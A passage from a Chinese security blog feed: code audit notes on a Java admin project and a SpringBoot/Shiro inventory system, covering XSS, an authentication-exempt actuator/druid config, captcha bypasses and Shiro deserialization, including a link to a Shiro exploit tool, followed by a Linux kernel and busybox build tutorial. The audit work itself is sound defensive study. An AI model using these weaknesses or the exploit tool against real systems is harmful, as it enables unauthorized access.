<p>我们可以找未经过Thymeleaf处理的地方，从而产生xss。比如在角色管理处插入xss。</p>
<img src="../images/pics/代码审计/22.jpg"  /> 

<p>除此之外还有很多地方</p>
<h2 id="8-未授权访问"><a href="#8-未授权访问" class="headerlink" title="8. 未授权访问"></a>8. 未授权访问</h2><p>该项目中使用了SpringSecurity，SpringSecurity会配置一些放行的静态资源，有时错误的配置会将一些关键资源放行，造成未授权访问。一般是为了开发方便调试开放的。</p>
<p>该项目中security/config/SpringSecurityConfig文件</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">configure</span><span class="params">(WebSecurity web)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       <span class="comment">//放行静态资源</span></span><br><span class="line">       web.ignoring()</span><br><span class="line">               .antMatchers(HttpMethod.GET,</span><br><span class="line">                       <span class="string">&quot;/swagger-resources/**&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/PearAdmin/**&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/component/**&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/admin/**&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/**/*.html&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/**/*.css&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/**/*.js&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/swagger-ui.html&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/webjars/**&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/v2/**&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/druid/**&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/actuator/**&quot;</span>);</span><br><span class="line">       web.ignoring().antMatchers(HttpMethod.POST,<span class="string">&quot;/druid/**&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>放行了swagger-ui.html，actuator等危险目录</p>
<img src="../images/pics/代码审计/23.jpg"  /> 



<h2 id="9-验证码绕过"><a href="#9-验证码绕过" class="headerlink" title="9. 验证码绕过"></a>9. 验证码绕过</h2><p>搜索关键字<code>captcha</code>等，该项目验证码逻辑在filter/VerifyCodeFilter。 该处的代码只是验证了是否为空，其他的逻辑被注释掉了，所以可以很轻松绕过。</p>
<img src="../images/pics/代码审计/24.jpg"  />





<h2 id="10-异常信息泄漏"><a href="#10-异常信息泄漏" class="headerlink" title="10. 异常信息泄漏"></a>10. 异常信息泄漏</h2><p>通过搜索<code>e.printStackTrace()</code>发现没有直接返回异常信息</p>
]]></content>
      <categories>
        <category>代码安全</category>
      </categories>
      <tags>
        <tag>代码安全</tag>
        <tag>代码审计</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>某进销存管理系统代码审计</title>
    <url>/%E6%9F%90%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>进销存管理系统，采用SpringBoot+Shiro+MyBatis+EasyUI。</p>
<span id="more"></span>

<h2 id="1-环境构建"><a href="#1-环境构建" class="headerlink" title="1. 环境构建"></a>1. 环境构建</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/wangjiangfei/</span>JXC</span><br></pre></td></tr></table></figure>

<p>将sql复制到linux服务器上</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">scp jxc.sql vuln:<span class="regexp">/tmp/</span></span><br></pre></td></tr></table></figure>

<p>在linux服务器上将sql文件复制到mysql容器</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln ~]# docker cp <span class="regexp">/tmp/</span>jxc.sql my-mysql:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>

<p>在mysql里创建jxc数据库并导入sql脚本</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">create</span> <span class="keyword">database</span> jxc;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="keyword">row</span> affected (<span class="number">0.02</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use jxc;</span><br><span class="line"><span class="keyword">Database</span> changed</span><br><span class="line"></span><br><span class="line">mysql&gt; source /root/jxc.<span class="keyword">sql</span></span><br></pre></td></tr></table></figure>

<p>idea设置远程部署</p>
<p>修改数据库连接文件的mysql密码</p>
<p>用idea打开项目后可能无法运行，这时候右键点击add maven project就可以了。</p>
<p><strong>需要注意的是：</strong></p>
<p>EasyUI框架，需要将该项目webapp下的所有文件复制到resources目录下的static目录下，这样才能正常访问。</p>
<p>添加端口指定<code>server.port=80</code></p>
<p>然后浏览器访问就可以了。</p>
<h2 id="2-第三方组件漏洞"><a href="#2-第三方组件漏洞" class="headerlink" title="2. 第三方组件漏洞"></a>2. 第三方组件漏洞</h2><h3 id="2-1-Shiro"><a href="#2-1-Shiro" class="headerlink" title="2.1 Shiro"></a>2.1 Shiro</h3><h4 id="2-1-1-Shiro-550反序列化"><a href="#2-1-1-Shiro-550反序列化" class="headerlink" title="2.1.1 Shiro-550反序列化"></a>2.1.1 Shiro-550反序列化</h4><p>shiro 1.x &lt; 1.2.5</p>
<h4 id="2-1-2-shiro-721"><a href="#2-1-2-shiro-721" class="headerlink" title="2.1.2 shiro-721"></a>2.1.2 shiro-721</h4><p>Apache Shiro &lt; 1.4.2版本</p>
<p>存在shiro-721，shiro721实际是很难利用的</p>
<p>下载自动化利用工具尝试：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/feihong-cs/</span>ShiroExploit-Deprecated<span class="regexp">/releases/</span>download<span class="regexp">/v2.51/</span>ShiroExploit.V2.<span class="number">51.7</span>z</span><br></pre></td></tr></table></figure>

<p>shiro-721需要知道已有的秘钥，我们在工具中填入remenber-me的值，并没有利用成功。</p>
<h4 id="2-1-3-权限绕过"><a href="#2-1-3-权限绕过" class="headerlink" title="2.1.3 权限绕过"></a>2.1.3 权限绕过</h4><p>Apache Shiro &lt; 1.5.2</p>
<p>Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon,authc等拦截器。</p>
<ul>
<li><ol>
<li>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</li>
</ol>
</li>
<li><ol start="2">
<li>authc为登录拦截器，需要登录认证才能访问的资源。</li>
</ol>
</li>
</ul>
<p>Shiro的URL路径表达式为Ant 格式，路径通配符支持?***。</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">?：匹配一个字符</span><br><span class="line"><span class="comment">*：匹配零个或多个字符串</span></span><br><span class="line"><span class="comment">**：匹配路径中的零个或多个路径</span></span><br></pre></td></tr></table></figure>

<p>项目中静态资源是anon，非静态资源都是<code>(&quot;/**&quot;, &quot;authc&quot;)</code>，所以是没法绕过的。</p>
<h2 id="2-验证码绕过"><a href="#2-验证码绕过" class="headerlink" title="2. 验证码绕过"></a>2. 验证码绕过</h2><p>验证码代码在<code>controller\UserController.java</code>，追踪代码后的处理逻辑代码如下</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!userLogin.get<span class="constructor">ImageCode()</span>.<span class="keyword">to</span><span class="constructor">UpperCase()</span>.equals(session.get<span class="constructor">Attribute(<span class="string">&quot;checkcode&quot;</span>)</span>))&#123;</span><br><span class="line">               return <span class="keyword">new</span> <span class="constructor">ServiceVO(ErrorCode.VERIFY_CODE_ERROR_CODE, ErrorCode.VERIFY_CODE_ERROR_MESS)</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>意思就是将验证码转为大写和session里的checkcode对比，也就是说session不变，验证码一直有效。</p>
<h2 id="3-xss-csrf"><a href="#3-xss-csrf" class="headerlink" title="3. xss csrf"></a>3. xss csrf</h2><p>xss和csrf很多，不再赘述。</p>
]]></content>
      <categories>
        <category>代码安全</category>
      </categories>
      <tags>
        <tag>代码安全</tag>
        <tag>代码审计</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>源码编译Linux内核</title>
    <url>/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91Linux%E5%86%85%E6%A0%B8/</url>
    <content><![CDATA[<p>编译Linux源码及文件系统</p>
<span id="more"></span>



<h2 id="1-下载linux内核源码"><a href="#1-下载linux内核源码" class="headerlink" title="1. 下载linux内核源码"></a>1. 下载linux内核源码</h2><p>访问：<a href="https://www.kernel.org/">https://www.kernel.org/</a></p>
<p>点击如下</p>
<img src="../images/pics/计算机底层/8.jpg" style="zoom:50%;" />

<p>点击linux</p>
<img src="../images/pics/计算机底层/9.jpg" style="zoom:50%;" /> 

<p>点击kernel</p>
<img src="../images/pics/计算机底层/10.jpg" style="zoom:50%;" /> 

<p>我们下载4.x的版本</p>
<img src="../images/pics/计算机底层/11.jpg" style="zoom:50%;" /> 

<p>下载4.9.229版本</p>
<img src="../images/pics/计算机底层/12.jpg" style="zoom:50%;" /> 

<p>复制连接地址，使用如下命令下载</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget -c https:<span class="regexp">//mi</span>rrors.edge.kernel.org<span class="regexp">/pub/</span>linux<span class="regexp">/kernel/</span>v4.x/linux-<span class="number">4.9</span>.<span class="number">229</span>.tar.gz</span><br></pre></td></tr></table></figure>

<p>-c参数指的是断点续传，取消后可以接着传</p>
<h2 id="2-linux内核源码目录介绍"><a href="#2-linux内核源码目录介绍" class="headerlink" title="2. linux内核源码目录介绍"></a>2. linux内核源码目录介绍</h2><p>下载完后我们可以进入目录</p>
<p><strong>arch目录</strong></p>
<p>arch目录是CPU体系相关的代码，有arm架构、x86架构等等。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">[root@debian <span class="keyword">arch</span>]# <span class="keyword">ls</span></span><br><span class="line"><span class="keyword">alpha</span>  arm64     c6x   h8300    Kconfig  metag       mn10300   parisc   <span class="keyword">score</span>  tile       x86</span><br><span class="line">arc    avr32     cris  hexagon  m32r     microblaze  nios2     powerpc  <span class="keyword">sh</span>     um         xtensa</span><br><span class="line">arm    blackfin  frv   ia64     m68k     mips        openrisc  s390     sparc  unicore32</span><br></pre></td></tr></table></figure>

<p>每个架构下面还有内核相关代码</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="literal">[<span class="identifier">root</span>@<span class="identifier">debian</span> <span class="identifier">arch</span>]</span># cd x86</span><br><span class="line"><span class="literal">[<span class="identifier">root</span>@<span class="identifier">debian</span> <span class="identifier">x86</span>]</span># ls</span><br><span class="line">boot     events   Kconfig        kvm       <span class="module-access"><span class="module"><span class="identifier">Makefile_32</span>.</span></span>cpu  net       power      tools</span><br><span class="line">configs  ia32     <span class="module-access"><span class="module"><span class="identifier">Kconfig</span>.</span></span>cpu    lguest    <span class="module-access"><span class="module"><span class="identifier">Makefile</span>.</span></span>um      oprofile  purgatory  um</span><br><span class="line">crypto   <span class="keyword">include</span>  <span class="module-access"><span class="module"><span class="identifier">Kconfig</span>.</span></span>debug  lib       math-emu         pci       ras        video</span><br><span class="line">entry    Kbuild   kernel         Makefile  mm               platform  realmode   xen</span><br></pre></td></tr></table></figure>



<p><strong>Documentation</strong></p>
<p>内核里的技术文档，关于内核参数、配置、特性等都有</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> linux<span class="number">-4.9</span><span class="number">.229</span>]<span class="meta"># cd Documentation</span></span><br><span class="line">[root<span class="symbol">@debian</span> Documentation]<span class="meta"># ls</span></span><br><span class="line"><span class="number">00</span>-INDEX                    gpu                          parisc</span><br><span class="line"><span class="number">80211</span>                       hid                          parport-lowlevel.txt</span><br><span class="line">ABI                         highuid.txt                  parport.txt</span><br><span class="line">accounting                  HOWTO                        PCI</span><br><span class="line">acpi                        hwmon                        pcmcia</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>



<p><strong>firmware</strong></p>
<p>固件相关代码</p>
<p><strong>init</strong></p>
<p>init是内核启动相关的代码</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">[root<span class="title">@debian</span> linux<span class="number">-4.9</span>.<span class="number">229</span>]# cd init</span><br><span class="line">[root<span class="title">@debian</span> init]# ls</span><br><span class="line">calibrate.<span class="keyword">c</span>  do_mounts.h         do_mounts_md.<span class="keyword">c</span>  initramfs.<span class="keyword">c</span>  Kconfig  Makefile       version.<span class="keyword">c</span></span><br><span class="line">do_mounts.<span class="keyword">c</span>  do_mounts_initrd.<span class="keyword">c</span>  do_mounts_rd.<span class="keyword">c</span>  init_task.<span class="keyword">c</span>  main.<span class="keyword">c</span>   noinitramfs.<span class="keyword">c</span></span><br></pre></td></tr></table></figure>

<p>main.c里面有一个start_kernel函数，这是开始执行C代码的位置，在此之前都是汇编代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">asmlinkage __visible <span class="keyword">void</span> __init <span class="title">start_kernel</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *command_line;</span><br><span class="line">        <span class="keyword">char</span> *after_dashes;</span><br><span class="line"></span><br><span class="line">        set_task_stack_end_magic(&amp;init_task);</span><br><span class="line">        smp_setup_processor_id();</span><br><span class="line">        debug_objects_early_init();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Set up the the initia</span></span><br></pre></td></tr></table></figure>



<p><strong>block</strong></p>
<p>block是块设备相关代码</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">[root<span class="title">@debian</span> linux<span class="number">-4.9</span>.<span class="number">229</span>]# cd block</span><br><span class="line">[root<span class="title">@debian</span> block]# ls</span><br><span class="line">badblocks.<span class="keyword">c</span>      blk-ioc.<span class="keyword">c</span>        blk-mq-tag.<span class="keyword">c</span>    bsg.<span class="keyword">c</span>               ioprio.<span class="keyword">c</span></span><br><span class="line">bio.<span class="keyword">c</span>            blk-lib.<span class="keyword">c</span>        blk-mq-tag.h    bsg-lib.<span class="keyword">c</span>           Kconfig</span><br><span class="line">bio-integrity.<span class="keyword">c</span>  blk-map.<span class="keyword">c</span>        blk-settings.<span class="keyword">c</span>  cfq-iosched.<span class="keyword">c</span>       Kconfig.iosched</span><br><span class="line">blk-cgroup.<span class="keyword">c</span>     blk-merge.<span class="keyword">c</span>      blk-softirq.<span class="keyword">c</span>   cmdline-parser.<span class="keyword">c</span>    Makefile</span><br><span class="line">blk-core.<span class="keyword">c</span>       blk-mq.<span class="keyword">c</span>         blk-sysfs.<span class="keyword">c</span>     compat_ioctl.<span class="keyword">c</span>      noop-iosched.<span class="keyword">c</span></span><br><span class="line">blk-exec.<span class="keyword">c</span>       blk-mq-cpumap.<span class="keyword">c</span>  blk-tag.<span class="keyword">c</span>       deadline-iosched.<span class="keyword">c</span>  partition-generic.<span class="keyword">c</span></span><br><span class="line">blk-flush.<span class="keyword">c</span>      blk-mq.h         blk-throttle.<span class="keyword">c</span>  elevator.<span class="keyword">c</span>          partitions</span><br><span class="line">blk.h            blk-mq-pci.<span class="keyword">c</span>     blk-timeout.<span class="keyword">c</span>   genhd.<span class="keyword">c</span>             scsi_ioctl.<span class="keyword">c</span></span><br><span class="line">blk-integrity.<span class="keyword">c</span>  blk-mq-sysfs.<span class="keyword">c</span>   bounce.<span class="keyword">c</span>        ioctl.<span class="keyword">c</span>             t<span class="number">10</span>-pi.<span class="keyword">c</span></span><br></pre></td></tr></table></figure>



<p><strong>drivers</strong></p>
<p>drivers代码量很大，外设特别多，所以需要更多的驱动支持。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[root@debian linux-<span class="number">4.9</span>.<span class="number">229</span>]# <span class="keyword">cd</span> drivers</span><br><span class="line">[root@debian drivers]# <span class="keyword">ls</span></span><br><span class="line">accessibility  cpufreq   gpu         Kconfig    net       pnp         sfi          vhost</span><br><span class="line">acpi           cpuidle   <span class="keyword">hid</span>         leds       nfc       power       <span class="keyword">sh</span>           video</span><br><span class="line">amba           crypto    hsi         lguest     ntb       powercap    <span class="keyword">sn</span>           virt</span><br><span class="line">android        dax       hv          lightnvm   nubus     pps         soc          virtio</span><br><span class="line">ata            dca       hwmon       macintosh  nvdimm    ps3         spi          vlyn</span><br></pre></td></tr></table></figure>



<p><strong>ipc</strong></p>
<p>ipc是进程通讯相关代码</p>
<p><strong>security</strong></p>
<p>安全相关代码</p>
<p><strong>net</strong></p>
<p>协议栈相关代码</p>
<p><strong>sound</strong></p>
<p>声音相关代码</p>
<p><strong>fs</strong></p>
<p>文件系统相关代码</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">[root<span class="title">@debian</span> linux<span class="number">-4.9</span>.<span class="number">229</span>]# cd fs/</span><br><span class="line">[root<span class="title">@debian</span> fs]# ls</span><br><span class="line"><span class="number">9</span>p                  cifs                 exportfs        ioctl.<span class="keyword">c</span>         nilfs<span class="number">2</span>            read_write.<span class="keyword">c</span></span><br><span class="line">adfs                coda                 ext<span class="number">2</span>            iomap.<span class="keyword">c</span>         nls               reiserfs</span><br><span class="line">affs                compat_binfmt_elf.<span class="keyword">c</span>  ext<span class="number">4</span>            isofs           no-block.<span class="keyword">c</span>        romfs</span><br><span class="line">afs                 compat.<span class="keyword">c</span>             f<span class="number">2</span>fs            jbd<span class="number">2</span>            notify</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p><strong>kernel</strong></p>
<p>kernel是内核核心相关代码，进程管理、进程调度等内核核心代码</p>
<p><strong>include</strong></p>
<p>头文件代码</p>
<p><strong>mm</strong></p>
<p>内存管理相关代码</p>
<h2 id="3-linux内核编译"><a href="#3-linux内核编译" class="headerlink" title="3. linux内核编译"></a>3. linux内核编译</h2><p><strong>1. 指定硬件体系架构</strong></p>
<p>我这里选择x86</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@debian linux-4.9.229]# <span class="builtin-name">export</span> <span class="attribute">ARCH</span>=x86</span><br></pre></td></tr></table></figure>



<p><strong>2. 配置board config</strong></p>
<p>此处为x86_64_deconfig</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@debian linux-<span class="number">4.9</span>.<span class="number">229</span>]<span class="comment"># make x86_64_defconfig</span></span><br><span class="line">  HOSTCC  scripts<span class="regexp">/basic/</span>fixdep</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>conf.o</span><br><span class="line">  SHIPPED scripts<span class="regexp">/kconfig/</span>zconf.tab.c</span><br><span class="line">  SHIPPED scripts<span class="regexp">/kconfig/</span>zconf.lex.c</span><br><span class="line">  SHIPPED scripts<span class="regexp">/kconfig/</span>zconf.hash.c</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>zconf.tab.o</span><br><span class="line">  HOSTLD  scripts<span class="regexp">/kconfig/</span>conf</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># configuration written to .config</span></span><br></pre></td></tr></table></figure>



<p><strong>3. 配置内核</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@debian linux-<span class="number">4.9</span>.<span class="number">229</span>]<span class="comment"># make menuconfig</span></span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/m</span>conf.o</span><br><span class="line">&lt;command-line&gt;: fatal error: curses.h: 没有那个文件或目录</span><br><span class="line">compilation terminated.</span><br><span class="line">make[<span class="number">1</span>]: *** [scripts<span class="regexp">/Makefile.host:118：scripts/</span>kconfig/mconf.o] 错误 <span class="number">1</span></span><br><span class="line">make: *** [Makefile:<span class="number">553</span>：menuconfig] 错误 <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>这里执行会报错，需要安装<code>apt install libncurses5-dev</code></p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> linux<span class="number">-4.9</span><span class="number">.229</span>]<span class="meta"># apt install libncurses5-dev</span></span><br></pre></td></tr></table></figure>

<p>再次执行，就会弹出配置界面</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@debian linux-<span class="number">4.9</span>.<span class="number">229</span>]<span class="comment"># make menuconfig</span></span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/m</span>conf.o</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>zconf.tab.o</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>lxdialog/checklist.o</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>lxdialog/util.o</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>lxdialog/inputbox.o</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>lxdialog/textbox.o</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>lxdialog/yesno.o</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/kconfig/</span>lxdialog/menubox.o</span><br><span class="line">  HOSTLD  scripts<span class="regexp">/kconfig/m</span>conf</span><br><span class="line">scripts<span class="regexp">/kconfig/m</span>conf  Kconfig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*** End of the configuration.</span><br><span class="line">*** Execute <span class="string">&#x27;make&#x27;</span> to start the build or try <span class="string">&#x27;make help&#x27;</span></span><br></pre></td></tr></table></figure>

<p>需要支持支持ramdisk驱动，如下操作</p>
<p>选择General setup回车</p>
<img src="../images/pics/计算机底层/13.jpg"/> 

<p>确保Initial RAM 有*号，被选中。</p>
<img src="../images/pics/计算机底层/14.jpg"/> 

<p>然后选择Exit，退到上一级目录。</p>
<p>进入Device Drivers, 再进入Block devices。给<code>RAM block device support</code>打上*。同时把<code>Default RAM disk size</code>调大一点到65536。</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">G<span class="function"><span class="title">eneral</span> setup  ---&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    D<span class="function"><span class="title">evice</span> Drivers  ---&gt;</span></span><br><span class="line"></span><br><span class="line">       [*] B<span class="function"><span class="title">lock</span> devices  ---&gt;</span></span><br><span class="line"></span><br><span class="line">               &lt;*&gt;   RAM <span class="keyword">block</span> device support</span><br><span class="line"></span><br><span class="line">               (<span class="number">65536</span>) Default RAM disk size (kbytes)</span><br></pre></td></tr></table></figure>

<p>M表示编程驱动</p>
<p>*表示把驱动编到内核里面</p>
<p>配置好后选择<code>Save</code>,再选择<code>Exit</code>退出，</p>
<p><strong>4. 编译</strong></p>
<p>执行make进行编译。编译好后在</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">[root@debian linux-4.9.229]# <span class="keyword">ls</span> -<span class="keyword">l</span> <span class="keyword">arch</span>/x86/<span class="keyword">boot</span>/bzImage</span><br><span class="line">-rw-r--r-- 1 root root 6795248 8月  24 21:24 <span class="keyword">arch</span>/x86/<span class="keyword">boot</span>/bzImage</span><br></pre></td></tr></table></figure>





<h2 id="4-编译文件系统"><a href="#4-编译文件系统" class="headerlink" title="4. 编译文件系统"></a>4. 编译文件系统</h2><h3 id="4-1-下载"><a href="#4-1-下载" class="headerlink" title="4.1 下载"></a>4.1 下载</h3><p>访问 busybox.net</p>
<p>这里找到1.30.1进行下载</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> -c https://busybox.net/downloads/busybox-<span class="number">1</span>.<span class="number">30</span>.<span class="number">1</span>.tar.bz<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>解压</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tar</span> -jxvf busybox-<span class="number">1</span>.<span class="number">30</span>.<span class="number">1</span>.tar.bz<span class="number">2</span></span><br></pre></td></tr></table></figure>



<h3 id="4-2-设置静态链接库"><a href="#4-2-设置静态链接库" class="headerlink" title="4.2 设置静态链接库"></a>4.2 设置静态链接库</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@debian busybox-<span class="number">1.30</span>.<span class="number">1</span>]<span class="comment"># make menuconfig</span></span><br><span class="line">  HOSTCC  scripts<span class="regexp">/basic/</span>fixdep</span><br><span class="line">  HOSTCC  scripts<span class="regexp">/basic/</span>split-include</span><br></pre></td></tr></table></figure>

<p>进入Settings，设置如下</p>
<img src="../images/pics/计算机底层/15.jpg"/>



<h3 id="4-3-编译"><a href="#4-3-编译" class="headerlink" title="4.3 编译"></a>4.3 编译</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@debian</span> busybox<span class="number">-1.30</span>.<span class="number">1</span>]<span class="comment"># make &amp;&amp; make install</span></span><br><span class="line">  SPLIT   <span class="keyword">include</span>/autoconf.h -&gt; <span class="keyword">include</span>/config/*</span><br><span class="line">  GEN     <span class="keyword">include</span>/bbconfigopts.h</span><br></pre></td></tr></table></figure>

<p>make会编译busybox, make install 会将工具busybox及工具安装到源码下install目录</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> busybox<span class="number">-1.30</span><span class="number">.1</span>]<span class="meta"># cd _install/</span></span><br><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta"># ls</span></span><br><span class="line">bin  linuxrc  sbin  usr</span><br></pre></td></tr></table></figure>



<h3 id="4-4-完善busybox文件系统"><a href="#4-4-完善busybox文件系统" class="headerlink" title="4.4 完善busybox文件系统"></a>4.4 完善busybox文件系统</h3><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta"># mkdir -p etc dev mnt</span></span><br><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta"># mkdir -p proc sys tmp</span></span><br><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta"># mkdir -p etc/init.d</span></span><br></pre></td></tr></table></figure>

<p>配置挂载目录</p>
<p>vim etc/fstab</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">proc</span>        /<span class="keyword">proc</span><span class="title">           proc</span> <span class="title">        defaults</span>        0        0<span class="title"></span></span><br><span class="line"><span class="title">tmpfs</span>       /tmp<span class="title">            tmpfs</span>    　　defaults        0        0<span class="title"></span></span><br><span class="line"><span class="title">sysfs</span>       /sys<span class="title">            sysfs</span> <span class="title">       defaults</span>        0        0</span><br></pre></td></tr></table></figure>



<p>配置busybox启动时候的代码</p>
<p>vim etc/init.d/rcS</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo -e <span class="string">&quot;Welcome to tinyLinux&quot;</span></span><br><span class="line"><span class="regexp">/bin/m</span>ount -a</span><br><span class="line">echo -e <span class="string">&quot;Remounting the root filesystem&quot;</span></span><br><span class="line">mount  -o  remount,rw  /</span><br><span class="line">mkdir -p <span class="regexp">/dev/</span>pts</span><br><span class="line">mount -t devpts devpts <span class="regexp">/dev/</span>pts</span><br><span class="line">echo <span class="regexp">/sbin/m</span>dev &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>hotplug</span><br><span class="line">mdev -s</span><br></pre></td></tr></table></figure>

<p>给予可执行权限</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta"># chmod 755 etc/init.d/rcS</span></span><br><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta">#</span></span><br></pre></td></tr></table></figure>



<p>busybox启动</p>
<p>[root@debian _install]# vim etc/inittab</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="meta">::sysinit:/etc/init.d/rcS</span></span><br><span class="line"><span class="meta">::respawn:-/bin/sh</span></span><br><span class="line"><span class="meta">::askfirst:-/bin/sh</span></span><br><span class="line"><span class="meta">::ctrlaltdel:/bin/umount</span> -a -r</span><br></pre></td></tr></table></figure>

<p>赋予可执行权限</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta"># chmod 755 etc/inittab</span></span><br><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta">#</span></span><br></pre></td></tr></table></figure>





<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> _install]<span class="meta"># cd dev</span></span><br><span class="line">[root<span class="symbol">@debian</span> dev]<span class="meta"># mknod console c 5 1</span></span><br><span class="line">[root<span class="symbol">@debian</span> dev]<span class="meta"># mknod null c 1 3</span></span><br><span class="line">[root<span class="symbol">@debian</span> dev]<span class="meta"># mknod tty1 c 4</span></span><br></pre></td></tr></table></figure>





<h3 id="4-5-制作根文件系统镜像文件"><a href="#4-5-制作根文件系统镜像文件" class="headerlink" title="4.5 制作根文件系统镜像文件"></a>4.5 制作根文件系统镜像文件</h3><p>切换到_install的父级目录</p>
